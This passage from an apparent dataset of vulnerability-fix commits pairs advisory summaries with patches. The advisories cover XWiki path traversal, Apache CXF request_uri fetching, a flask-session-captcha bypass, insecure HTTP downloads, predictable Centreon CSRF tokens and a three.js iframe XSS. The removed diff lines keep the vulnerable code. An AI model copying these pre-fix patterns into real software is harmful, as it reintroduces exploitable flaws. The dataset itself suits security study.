ifr.style.visibility = 'hidden';\\n                 ifr.style.position = 'absolute';\\n-                ifr.style.width = ifr.style.height = ifr.style.borderWidth = '0px';\\n+                ifr.style.width = ifr.style.height = ifr.borderWidth = '0px';\\n \\n                 adalFrame = document.getElementsByTagName('body')[0].appendChild(ifr);\\n             }\\n@@ -1764,52 +1760,37 @@ var AuthenticationContext = (function () {\\n     };\\n \\n     \/**\\n-     * Returns true if the browser supports given storage type\\n+     * Returns true if browser supports localStorage, false otherwise.\\n      * @ignore\\n      *\/\\n-    AuthenticationContext.prototype._supportsStorage = function(storageType) {\\n-        if (!(storageType in this._storageSupport)) {\\n-            return false;\\n-        }\\n-\\n-        if (this._storageSupport[storageType] !== null) {\\n-            return this._storageSupport[storageType];\\n-        }\\n-\\n+    AuthenticationContext.prototype._supportsLocalStorage = function () {\\n         try {\\n-            if (!(storageType in window) || window[storageType] === null) {\\n-                throw new Error();\\n-            }\\n-            var testKey = '__storageTest__';\\n-            window[storageType].setItem(testKey, 'A');\\n-            if (window[storageType].getItem(testKey) !== 'A') {\\n-                throw new Error();\\n-            }\\n-            window[storageType].removeItem(testKey);\\n-            if (window[storageType].getItem(testKey)) {\\n-                throw new Error();\\n-            }\\n-            this._storageSupport[storageType] = true;\\n+            if (!window.localStorage) return false; \/\/ Test availability\\n+            window.localStorage.setItem('storageTest', 'A'); \/\/ Try write\\n+            if (window.localStorage.getItem('storageTest') != 'A') return false; \/\/ Test read\/write\\n+            window.localStorage.removeItem('storageTest'); \/\/ Try delete\\n+            if (window.localStorage.getItem('storageTest')) return false; \/\/ Test delete\\n+            return true; \/\/ Success\\n         } catch (e) {\\n-            this._storageSupport[storageType] = false;\\n+            return false;\\n         }\\n-        return this._storageSupport[storageType];\\n-    }\\n-\\n-    \/**\\n-     * Returns true if browser supports localStorage, false otherwise.\\n-     * @ignore\\n-     *\/\\n-    AuthenticationContext.prototype._supportsLocalStorage = function () {        \\n-        return this._supportsStorage('localStorage');\\n     };\\n \\n     \/**\\n      * Returns true if browser supports sessionStorage, false otherwise.\\n      * @ignore\\n      *\/\\n     AuthenticationContext.prototype._supportsSessionStorage = function () {\\n-        return this._supportsStorage('sessionStorage');\\n+        try {\\n+            if (!window.sessionStorage) return false; \/\/ Test availability\\n+            window.sessionStorage.setItem('storageTest', 'A'); \/\/ Try write\\n+            if (window.sessionStorage.getItem('storageTest') != 'A') return false; \/\/ Test read\/write\\n+            window.sessionStorage.removeItem('storageTest'); \/\/ Try delete\\n+            if (window.sessionStorage.getItem('storageTest')) return false; \/\/ Test delete\\n+            return true; \/\/ Success\\n+        } catch (e) {\\n+            return false;\\n+        }\\n     };\\n \\n     \/**\\n@@ -1955,4 +1936,4 @@ var AuthenticationContext = (function () {\\n \\n     return AuthenticationContext;\\n \\n-}());\\n\\\\ No newline at end of file\\n+}());\"}}","message_norm":"adal.js update","language":"id","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SUBMIT_CENTERED","list_files":"dict_keys(['src\/adal.js'])","num_files":1.0},{"index":1048,"vuln_id":"GHSA-7ph6-5cmq-xgjq","cwe_id":"{'CWE-22'}","score":6.8,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/ab778254fb8f71c774e1c1239368c44fe3b6bba5'}","dataset":"osv","summary":"Path traversal in xwiki-platform-skin-skinx XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. AbstractSxExportURLFactoryActionHandler#processSx does not escape anything from SSX document reference when serializing it on filesystem, so it's easy to mess up the HTML export process with reference elements containing filesystem syntax like \"..\/\", \".\/\". or \"\/\" in general (the last two not causing any security threat, but can cause conflicts with others serialized files). Patch can be found in 13.6-rc-1. Giving script or subwiki admin right only to trusted people and disabling HTML\/PDF export can be done as workaround.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/ab778254fb8f71c774e1c1239368c44fe3b6bba5","commit_sha":"ab778254fb8f71c774e1c1239368c44fe3b6bba5","patch":"SINGLE","chain_ord":"['ab778254fb8f71c774e1c1239368c44fe3b6bba5']","before_first_fix_commit":"{'9e4d40d03960b20233f6887bc142fe4474f620c4'}","last_fix_commit":"ab778254fb8f71c774e1c1239368c44fe3b6bba5","chain_ord_pos":1.0,"commit_datetime":"07\/07\/2021, 14:02:50","message":"XWIKI-18819: It's possible to save pretty much anything anywhere by creating and using an SSX\/JSX containing \"..\/\" in its reference","author":"Thomas Mortagne","comments":null,"stats":"{'additions': 7, 'deletions': 11, 'total': 18}","files":"{'xwiki-platform-core\/xwiki-platform-skin\/xwiki-platform-skin-skinx\/src\/main\/java\/org\/xwiki\/skinx\/internal\/AbstractSxExportURLFactoryActionHandler.java': {'additions': 7, 'deletions': 11, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/ab778254fb8f71c774e1c1239368c44fe3b6bba5\/xwiki-platform-core%2Fxwiki-platform-skin%2Fxwiki-platform-skin-skinx%2Fsrc%2Fmain%2Fjava%2Forg%2Fxwiki%2Fskinx%2Finternal%2FAbstractSxExportURLFactoryActionHandler.java', 'patch': '@@ -100,13 +100,13 @@ public URL createURL(String spaces, String name, String queryString, String anch\\n         XWikiDocument.backupContext(backup, context);\\n         try {\\n             sxDocument.setAsContextDoc(context);\\n-            return processSx(spaceNames, name, queryString, context, exportContext);\\n+            return processSx(sxDocument.getId(), queryString, context, exportContext);\\n         } finally {\\n             XWikiDocument.restoreContext(backup, context);\\n         }\\n     }\\n \\n-    private URL processSx(List<String> spaceNames, String name, String queryString, XWikiContext context,\\n+    private URL processSx(long id, String queryString, XWikiContext context,\\n         FilesystemExportContext exportContext) throws Exception\\n     {\\n         SxSource sxSource = null;\\n@@ -128,7 +128,7 @@ private URL processSx(List<String> spaceNames, String name, String queryString,\\n \\n         \/\/ Write the content to file\\n         \/\/ We need a unique name for that SSX content\\n-        String targetPath = String.format(\"%s\/%s\/%s\", getSxPrefix(), StringUtils.join(spaceNames, \\'\/\\'), name);\\n+        String targetPath = String.format(\"%s\/%s\", getSxPrefix(), id);\\n         File targetDirectory = new File(exportContext.getExportDir(), targetPath);\\n         if (!targetDirectory.exists()) {\\n             targetDirectory.mkdirs();\\n@@ -146,11 +146,7 @@ private URL processSx(List<String> spaceNames, String name, String queryString,\\n \\n         path.append(getSxPrefix());\\n         path.append(URL_PATH_SEPARATOR);\\n-        for (String spaceName : spaceNames) {\\n-            path.append(encodeURLPart(spaceName));\\n-            path.append(URL_PATH_SEPARATOR);\\n-        }\\n-        path.append(encodeURLPart(name));\\n+        path.append(id);\\n         path.append(URL_PATH_SEPARATOR);\\n         path.append(encodeURLPart(targetLocation.getName()));\\n \\n@@ -161,14 +157,14 @@ protected String getContent(SxSource sxSource, FilesystemExportContext exportCon\\n     {\\n         String content;\\n \\n-        \/\/ We know we\\'re inside a SX file located at \"<S|J>sx\/<Space>\/<Page>\/<s|j>sx<NNN>.<css|js>\". Inside this CSS\\n+        \/\/ We know we\\'re inside a SX file located at \"<S|J>sx\/<id>\/<s|j>sx<NNN>.<css|js>\". Inside this CSS\\n         \/\/ there can be URLs and we need to ensure that the prefix for these URLs lead to the root of the path, i.e.\\n-        \/\/ 3 levels up (\"..\/..\/..\/\").\\n+        \/\/ 3 levels up (\"..\/..\/\").\\n         \/\/ To make this happen we reuse the Doc Parent Level from FileSystemExportContext to a fixed value of 3.\\n         \/\/ We also make sure to put back the original value\\n         int originalDocParentLevel = exportContext.getDocParentLevel();\\n         try {\\n-            exportContext.setDocParentLevels(3);\\n+            exportContext.setDocParentLevels(2);\\n             content = sxSource.getContent();\\n         } finally {\\n             exportContext.setDocParentLevels(originalDocParentLevel);'}}","message_norm":"xwiki-18819: it's possible to save pretty much anything anywhere by creating and using an ssx\/jsx containing \"..\/\" in its reference","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-skin\/xwiki-platform-skin-skinx\/src\/main\/java\/org\/xwiki\/skinx\/internal\/AbstractSxExportURLFactoryActionHandler.java'])","num_files":1.0},{"index":1058,"vuln_id":"GHSA-7q4h-pj78-j7vg","cwe_id":"{'CWE-400', 'CWE-918'}","score":7.5,"chain":"{'https:\/\/github.com\/apache\/cxf\/commit\/aa789c5c4686597a7bdef2443909ab491fc2bc04', 'https:\/\/github.com\/apache\/cxf\/commit\/40503a53914758759894f704bbf139ae89ace286'}","dataset":"osv","summary":"Authorization service vulnerable to DDos attacks in Apache CFX CXF supports (via JwtRequestCodeFilter) passing OAuth 2 parameters via a JWT token as opposed to query parameters (see: The OAuth 2.0 Authorization Framework: JWT Secured Authorization Request (JAR)). Instead of sending a JWT token as a \"request\" parameter, the spec also supports specifying a URI from which to retrieve a JWT token from via the \"request_uri\" parameter. CXF was not validating the \"request_uri\" parameter (apart from ensuring it uses \"https) and was making a REST request to the parameter in the request to retrieve a token. This means that CXF was vulnerable to DDos attacks on the authorization server, as specified in section 10.4.1 of the spec. This issue affects Apache CXF versions prior to 3.4.3; Apache CXF versions prior to 3.3.10.","published_date":"2021-05-13","chain_len":2,"project":"https:\/\/github.com\/apache\/cxf","commit_href":"https:\/\/github.com\/apache\/cxf\/commit\/aa789c5c4686597a7bdef2443909ab491fc2bc04","commit_sha":"aa789c5c4686597a7bdef2443909ab491fc2bc04","patch":"MULTI","chain_ord":"['40503a53914758759894f704bbf139ae89ace286', 'aa789c5c4686597a7bdef2443909ab491fc2bc04']","before_first_fix_commit":"{'40503a53914758759894f704bbf139ae89ace286'}","last_fix_commit":"aa789c5c4686597a7bdef2443909ab491fc2bc04","chain_ord_pos":2.0,"commit_datetime":"01\/06\/2021, 10:38:21","message":"Make sure both a request + request_uri can't be specified","author":"Colm O hEigeartaigh","comments":null,"stats":"{'additions': 11, 'deletions': 1, 'total': 12}","files":"{'rt\/rs\/security\/oauth-parent\/oauth2\/src\/main\/java\/org\/apache\/cxf\/rs\/security\/oauth2\/grants\/code\/JwtRequestCodeFilter.java': {'additions': 11, 'deletions': 1, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/cxf\/raw\/aa789c5c4686597a7bdef2443909ab491fc2bc04\/rt%2Frs%2Fsecurity%2Foauth-parent%2Foauth2%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fcxf%2Frs%2Fsecurity%2Foauth2%2Fgrants%2Fcode%2FJwtRequestCodeFilter.java', 'patch': '@@ -21,9 +21,11 @@\\n import java.security.cert.X509Certificate;\\n import java.util.List;\\n import java.util.Map;\\n+import java.util.logging.Logger;\\n \\n import javax.ws.rs.core.MultivaluedMap;\\n \\n+import org.apache.cxf.common.logging.LogUtils;\\n import org.apache.cxf.helpers.CastUtils;\\n import org.apache.cxf.jaxrs.client.WebClient;\\n import org.apache.cxf.jaxrs.impl.MetadataMap;\\n@@ -42,23 +44,31 @@\\n import org.apache.cxf.rt.security.crypto.CryptoUtils;\\n \\n public class JwtRequestCodeFilter extends OAuthJoseJwtConsumer implements AuthorizationRequestFilter {\\n+    protected static final Logger LOG = LogUtils.getL7dLogger(JwtRequestCodeFilter.class);\\n     private static final String REQUEST_URI_CONTENT_TYPE = \"application\/oauth-authz-req+jwt\";\\n     private static final String REQUEST_PARAM = \"request\";\\n     private static final String REQUEST_URI_PARAM = \"request_uri\";\\n+\\n     private boolean verifyWithClientCertificates;\\n     private String issuer;\\n     private JsonMapObjectReaderWriter jsonHandler = new JsonMapObjectReaderWriter();\\n+\\n     @Override\\n     public MultivaluedMap<String, String> process(MultivaluedMap<String, String> params,\\n                                                   UserSubject endUser,\\n                                                   Client client) {\\n         String requestToken = params.getFirst(REQUEST_PARAM);\\n+        String requestUri = params.getFirst(REQUEST_URI_PARAM);\\n+\\n         if (requestToken == null) {\\n-            String requestUri = params.getFirst(REQUEST_URI_PARAM);\\n             if (isRequestUriValid(client, requestUri)) {\\n                 requestToken = WebClient.create(requestUri).accept(REQUEST_URI_CONTENT_TYPE).get(String.class);\\n             }\\n+        } else if (requestUri != null) {\\n+            LOG.warning(\"It is not valid to specify both a request and request_uri value\");\\n+            throw new SecurityException();\\n         }\\n+\\n         if (requestToken != null) {\\n             JweDecryptionProvider theDecryptor = super.getInitializedDecryptionProvider(client.getClientSecret());\\n             JwsSignatureVerifier theSigVerifier = getInitializedSigVerifier(client);'}}","message_norm":"make sure both a request + request_uri can't be specified","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['rt\/rs\/security\/oauth-parent\/oauth2\/src\/main\/java\/org\/apache\/cxf\/rs\/security\/oauth2\/grants\/code\/JwtRequestCodeFilter.java'])","num_files":1.0},{"index":1059,"vuln_id":"GHSA-7q4h-pj78-j7vg","cwe_id":"{'CWE-400', 'CWE-918'}","score":7.5,"chain":"{'https:\/\/github.com\/apache\/cxf\/commit\/aa789c5c4686597a7bdef2443909ab491fc2bc04', 'https:\/\/github.com\/apache\/cxf\/commit\/40503a53914758759894f704bbf139ae89ace286'}","dataset":"osv","summary":"Authorization service vulnerable to DDos attacks in Apache CFX CXF supports (via JwtRequestCodeFilter) passing OAuth 2 parameters via a JWT token as opposed to query parameters (see: The OAuth 2.0 Authorization Framework: JWT Secured Authorization Request (JAR)). Instead of sending a JWT token as a \"request\" parameter, the spec also supports specifying a URI from which to retrieve a JWT token from via the \"request_uri\" parameter. CXF was not validating the \"request_uri\" parameter (apart from ensuring it uses \"https) and was making a REST request to the parameter in the request to retrieve a token. This means that CXF was vulnerable to DDos attacks on the authorization server, as specified in section 10.4.1 of the spec. This issue affects Apache CXF versions prior to 3.4.3; Apache CXF versions prior to 3.3.10.","published_date":"2021-05-13","chain_len":2,"project":"https:\/\/github.com\/apache\/cxf","commit_href":"https:\/\/github.com\/apache\/cxf\/commit\/40503a53914758759894f704bbf139ae89ace286","commit_sha":"40503a53914758759894f704bbf139ae89ace286","patch":"MULTI","chain_ord":"['40503a53914758759894f704bbf139ae89ace286', 'aa789c5c4686597a7bdef2443909ab491fc2bc04']","before_first_fix_commit":"{'40503a53914758759894f704bbf139ae89ace286'}","last_fix_commit":"aa789c5c4686597a7bdef2443909ab491fc2bc04","chain_ord_pos":1.0,"commit_datetime":"01\/06\/2021, 09:30:08","message":"Disallow OAuth2 request_uri by default","author":"Colm O hEigeartaigh","comments":null,"stats":"{'additions': 13, 'deletions': 4, 'total': 17}","files":"{'rt\/rs\/security\/oauth-parent\/oauth2\/src\/main\/java\/org\/apache\/cxf\/rs\/security\/oauth2\/grants\/code\/JwtRequestCodeFilter.java': {'additions': 13, 'deletions': 4, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/cxf\/raw\/40503a53914758759894f704bbf139ae89ace286\/rt%2Frs%2Fsecurity%2Foauth-parent%2Foauth2%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fcxf%2Frs%2Fsecurity%2Foauth2%2Fgrants%2Fcode%2FJwtRequestCodeFilter.java', 'patch': '@@ -42,6 +42,7 @@\\n import org.apache.cxf.rt.security.crypto.CryptoUtils;\\n \\n public class JwtRequestCodeFilter extends OAuthJoseJwtConsumer implements AuthorizationRequestFilter {\\n+    private static final String REQUEST_URI_CONTENT_TYPE = \"application\/oauth-authz-req+jwt\";\\n     private static final String REQUEST_PARAM = \"request\";\\n     private static final String REQUEST_URI_PARAM = \"request_uri\";\\n     private boolean verifyWithClientCertificates;\\n@@ -55,7 +56,7 @@ public MultivaluedMap<String, String> process(MultivaluedMap<String, String> par\\n         if (requestToken == null) {\\n             String requestUri = params.getFirst(REQUEST_URI_PARAM);\\n             if (isRequestUriValid(client, requestUri)) {\\n-                requestToken = WebClient.create(requestUri).get(String.class);\\n+                requestToken = WebClient.create(requestUri).accept(REQUEST_URI_CONTENT_TYPE).get(String.class);\\n             }\\n         }\\n         if (requestToken != null) {\\n@@ -101,9 +102,17 @@ public MultivaluedMap<String, String> process(MultivaluedMap<String, String> par\\n         }\\n         return params;\\n     }\\n-    private boolean isRequestUriValid(Client client, String requestUri) {\\n-        \/\/TODO: consider restricting to specific hosts\\n-        return requestUri != null && requestUri.startsWith(\"https:\/\/\");\\n+\\n+    \/**\\n+     * This method must be overridden to support request_uri. Take care to validate the request_uri properly,\\n+     * as otherwise it could lead to a security problem\\n+     * (https:\/\/tools.ietf.org\/html\/draft-ietf-oauth-jwsreq-30#section-10.4)\\n+     * @param client the Client object\\n+     * @param requestUri the request_uri parameter to validate\\n+     * @return whether the requestUri is permitted or not\\n+     *\/\\n+    protected boolean isRequestUriValid(Client client, String requestUri) {\\n+        return false;\\n     }\\n     protected JwsSignatureVerifier getInitializedSigVerifier(Client c) {\\n         if (verifyWithClientCertificates) {'}}","message_norm":"disallow oauth2 request_uri by default","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['rt\/rs\/security\/oauth-parent\/oauth2\/src\/main\/java\/org\/apache\/cxf\/rs\/security\/oauth2\/grants\/code\/JwtRequestCodeFilter.java'])","num_files":1.0},{"index":1072,"vuln_id":"GHSA-7r87-cj48-wj45","cwe_id":"{'CWE-253', 'CWE-394', 'CWE-754'}","score":5.3,"chain":"{'https:\/\/github.com\/Tethik\/flask-session-captcha\/commit\/2811ae23a38d33b620fb7a07de8837c6d65c13e4'}","dataset":"osv","summary":"Potential Captcha Validate Bypass in flask-session-captcha ### Impact\nflask-session-captcha is a package which allows users to extend Flask by adding an image based captcha stored in a server side session.\n\nThe `captcha.validate()` function would return `None` if passed no value (e.g. by submitting a request with an empty form).\n\nIf implementing users were checking the return value to be **False**, the captcha verification check could be bypassed.\n\nSample vulnerable code:\n```python\nif captcha.validate() == False:\n    ... # abort\nelse:\n   ... # do stuff\n```\n\n### Patches\nA new version (1.2.1) is available that fixes the issue.\n\n### Workarounds\nUsers can workaround the issue by not explicitly checking that the value is False. \n\nChecking the return value less explicitly should still work. \n\n```python\nif not captcha.validate():\n    ... # abort\nelse:\n   ... # do stuff\n```\n\n```python\nif captcha.validate():\n    ... # do stuff\nelse:\n   ... # abort\n```\n\n### References\nhttps:\/\/github.com\/Tethik\/flask-session-captcha\/pull\/27\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the github repo](https:\/\/github.com\/Tethik\/flask-session-captcha)","published_date":"2022-04-26","chain_len":1,"project":"https:\/\/github.com\/Tethik\/flask-session-captcha","commit_href":"https:\/\/github.com\/Tethik\/flask-session-captcha\/commit\/2811ae23a38d33b620fb7a07de8837c6d65c13e4","commit_sha":"2811ae23a38d33b620fb7a07de8837c6d65c13e4","patch":"SINGLE","chain_ord":"['2811ae23a38d33b620fb7a07de8837c6d65c13e4']","before_first_fix_commit":"{'50b4053766b89e9322cfbd281c91cb4e8898d3f7'}","last_fix_commit":"2811ae23a38d33b620fb7a07de8837c6d65c13e4","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2022, 21:40:14","message":"add some extra tests to ensure False is returned","author":"Joakim Uddholm","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'test_flask_session_captcha.py': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Tethik\/flask-session-captcha\/raw\/2811ae23a38d33b620fb7a07de8837c6d65c13e4\/test_flask_session_captcha.py', 'patch': '@@ -98,7 +98,13 @@ def test_captcha_validate_value(self):\\n         with self.app.test_request_context(\\'\/\\'):\\n             captcha.generate()\\n             answer = captcha.get_answer()\\n-            assert not captcha.validate(value=\"wrong\")\\n+            assert captcha.validate(value=None) == False\\n+            captcha.generate()\\n+            answer = captcha.get_answer()\\n+            assert captcha.validate(value=\"\") == False\\n+            captcha.generate()\\n+            answer = captcha.get_answer()\\n+            assert captcha.validate(value=\"wrong\") == False\\n             captcha.generate()\\n             answer = captcha.get_answer()\\n             assert captcha.validate(value=answer)'}}","message_norm":"add some extra tests to ensure false is returned","language":"en","entities":"[('add', 'ACTION', ''), ('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['test_flask_session_captcha.py'])","num_files":1.0},{"index":1073,"vuln_id":"GHSA-7r8m-45gc-m2c8","cwe_id":"{'CWE-311'}","score":0.0,"chain":"{'https:\/\/github.com\/Janpot\/mongodb-instance\/commit\/c8fea750f8020ace8410c442b2684b33a9fddd3b'}","dataset":"osv","summary":"Downloads Resources over HTTP in mongodb-instance Affected versions of `mongodb-instance` insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `mongodb-instance`.\n\n\n## Recommendation\n\nUpdate to version 0.0.3 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/Janpot\/mongodb-instance","commit_href":"https:\/\/github.com\/Janpot\/mongodb-instance\/commit\/c8fea750f8020ace8410c442b2684b33a9fddd3b","commit_sha":"c8fea750f8020ace8410c442b2684b33a9fddd3b","patch":"SINGLE","chain_ord":"['c8fea750f8020ace8410c442b2684b33a9fddd3b']","before_first_fix_commit":"{'02ce5a3c48d7ac1f6c33819b0c79afecbacace70'}","last_fix_commit":"c8fea750f8020ace8410c442b2684b33a9fddd3b","chain_ord_pos":1.0,"commit_datetime":"11\/02\/2016, 14:19:21","message":"use https","author":"Jan Potoms","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'install.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Janpot\/mongodb-instance\/raw\/c8fea750f8020ace8410c442b2684b33a9fddd3b\/install.js', 'patch': \"@@ -37,7 +37,7 @@ if (process.platform === 'linux' && process.arch === 'x64') {\\n \\n \\n var downloadUrl = util.format(\\n-  'http:\/\/downloads.mongodb.org\/osx\/mongodb-%s-%s.%s',\\n+  'https:\/\/fastdl.mongodb.org\/osx\/mongodb-%s-%s.%s',\\n   platformPart,\\n   versionPart,\\n   extension\"}}","message_norm":"use https","language":"et","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['install.js'])","num_files":1.0},{"index":1077,"vuln_id":"GHSA-7rg4-266c-jqw6","cwe_id":"{'CWE-330', 'CWE-352'}","score":6.5,"chain":"{'https:\/\/github.com\/centreon\/centreon\/commit\/626d3fb91cef402df0ebda5a8165d8f45da67c7a', 'https:\/\/github.com\/centreon\/centreon\/commit\/0261d4b250135eb513fdb7d52ba6fdeb19c6863f'}","dataset":"osv","summary":"Predictable CSRF tokens in centreon\/centreon An issue was discovered in Centreon-Web in Centreon Platform 20.10.0. The anti-CSRF token generation is predictable, which might allow CSRF attacks that add an admin user.","published_date":"2021-06-08","chain_len":2,"project":"https:\/\/github.com\/centreon\/centreon","commit_href":"https:\/\/github.com\/centreon\/centreon\/commit\/626d3fb91cef402df0ebda5a8165d8f45da67c7a","commit_sha":"626d3fb91cef402df0ebda5a8165d8f45da67c7a","patch":"MULTI","chain_ord":"['0261d4b250135eb513fdb7d52ba6fdeb19c6863f', '626d3fb91cef402df0ebda5a8165d8f45da67c7a']","before_first_fix_commit":"{'9a69f217db9af7820823df14a5fa737d554aa2c8'}","last_fix_commit":"626d3fb91cef402df0ebda5a8165d8f45da67c7a","chain_ord_pos":2.0,"commit_datetime":"03\/24\/2021, 13:36:03","message":"fix(sec): use openssl_random_pseudo_bytes to generate csrf token (#9612)\n\nRefs: MON-6772","author":"Kevin Duret","comments":null,"stats":"{'additions': 2, 'deletions': 5, 'total': 7}","files":"{'www\/lib\/HTML\/QuickForm\/HTML_QuickFormCustom.php': {'additions': 2, 'deletions': 5, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/centreon\/centreon\/raw\/626d3fb91cef402df0ebda5a8165d8f45da67c7a\/www%2Flib%2FHTML%2FQuickForm%2FHTML_QuickFormCustom.php', 'patch': \"@@ -85,12 +85,9 @@ public function &createElement($elementType)\\n      *\/\\n     public function createSecurityToken()\\n     {\\n-        $token = md5(uniqid());\\n+        $token = bin2hex(openssl_random_pseudo_bytes(16));\\n \\n-        if (false === isset($_SESSION['x-centreon-token']) &&\\n-            (isset($_SESSION['x-centreon-token']) &&\\n-                false === is_array($_SESSION['x-centreon-token']))\\n-        ) {\\n+        if (!isset($_SESSION['x-centreon-token']) || !is_array($_SESSION['x-centreon-token'])) {\\n             $_SESSION['x-centreon-token'] = array();\\n             $_SESSION['x-centreon-token-generated-at'] = array();\\n         }\"}}","message_norm":"fix(sec): use openssl_random_pseudo_bytes to generate csrf token (#9612)\n\nrefs: mon-6772","language":"en","entities":"[('fix(sec', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('#9612', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['www\/lib\/HTML\/QuickForm\/HTML_QuickFormCustom.php'])","num_files":1.0},{"index":1086,"vuln_id":"GHSA-7vvq-7r29-5vg3","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/mrdoob\/three.js\/commit\/0c31bc605e21965aad8a6479bb1969351773f76d'}","dataset":"osv","summary":"Cross site scripting in three.js # CVE has been withdrawn\n\nVersions of three.js prior to 0.137.0 load untrusted iframes and allow for attackers to inject arbitrary javascript into a users browser.","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/mrdoob\/three.js","commit_href":"https:\/\/github.com\/mrdoob\/three.js\/commit\/0c31bc605e21965aad8a6479bb1969351773f76d","commit_sha":"0c31bc605e21965aad8a6479bb1969351773f76d","patch":"SINGLE","chain_ord":"['0c31bc605e21965aad8a6479bb1969351773f76d']","before_first_fix_commit":"{'55d4f24cb50e995b0dfee73979305e8237384a53'}","last_fix_commit":"0c31bc605e21965aad8a6479bb1969351773f76d","chain_ord_pos":1.0,"commit_datetime":"01\/24\/2022, 17:39:24","message":"Only load trusted iframe (#23245)","author":"Rohan Sharma","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'docs\/index.html': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mrdoob\/three.js\/raw\/0c31bc605e21965aad8a6479bb1969351773f76d\/docs%2Findex.html', 'patch': '@@ -498,7 +498,7 @@ <h1><a href=\"https:\/\/threejs.org\">three.js<\/a><\/h1>\\n \\t\\t\\tconst oldIframe = iframe;\\n \\t\\t\\tiframe = oldIframe.cloneNode();\\n \\n-\\t\\t\\tif ( hash ) {\\n+\\t\\t\\tif ( hash && titles[ splitHash[ 0 ] ] ) {\\n \\n \\t\\t\\t\\tiframe.src = splitHash[ 0 ] + \\'.html\\' + splitHash[ 1 ];\\n \\t\\t\\t\\tsubtitle = titles[ splitHash[ 0 ] ] + splitHash[ 1 ] + \\' \u2013 \\';'}}","message_norm":"only load trusted iframe (#23245)","language":"en","entities":"[('#23245', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['docs\/index.html'])","num_files":1.0},{"index":1094,"vuln_id":"GHSA-7wv8-g97r-432h","cwe_id":"{'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/e680e134a4215c979bfd2eaf58336be34c8fc6e6'}","dataset":"osv","summary":"Exposure of Sensitive Information to an Unauthorized Actor in microweber Exposure of Sensitive Information to an Unauthorized Actor in Packagist microweber\/microweber prior to 1.2.11.","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/e680e134a4215c979bfd2eaf58336be34c8fc6e6","commit_sha":"e680e134a4215c979bfd2eaf58336be34c8fc6e6","patch":"SINGLE","chain_ord":"['e680e134a4215c979bfd2eaf58336be34c8fc6e6']","before_first_fix_commit":"{'62aa09ed44ff63f5fffc5addbf000423d7c38e44'}","last_fix_commit":"e680e134a4215c979bfd2eaf58336be34c8fc6e6","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2022, 09:35:10","message":"search_authors only admins","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/MicroweberPackages\/User\/helpers\/api_user.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/e680e134a4215c979bfd2eaf58336be34c8fc6e6\/src%2FMicroweberPackages%2FUser%2Fhelpers%2Fapi_user.php', 'patch': \"@@ -63,9 +63,9 @@\\n \\n });\\n \\n-api_expose('users\/search_authors', function ($params = false) {\\n+api_expose_admin('users\/search_authors', function ($params = false) {\\n \\n-    $return = array();\\n+    $return = array(); \\n \\n     $kw = false;\\n     if (isset($params['kw'])) {\"}}","message_norm":"search_authors only admins","language":"en","entities":"[('admins', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/User\/helpers\/api_user.php'])","num_files":1.0},{"index":1098,"vuln_id":"GHSA-7x2h-3v2v-24p9","cwe_id":"{'CWE-352'}","score":6.5,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/63447b369973724f0d352a006f25af6ff71ae292'}","dataset":"osv","summary":"Cross-Site Request Forgery in microweber microweber version 1.2.10 and prior is vulnerable to cross-site request 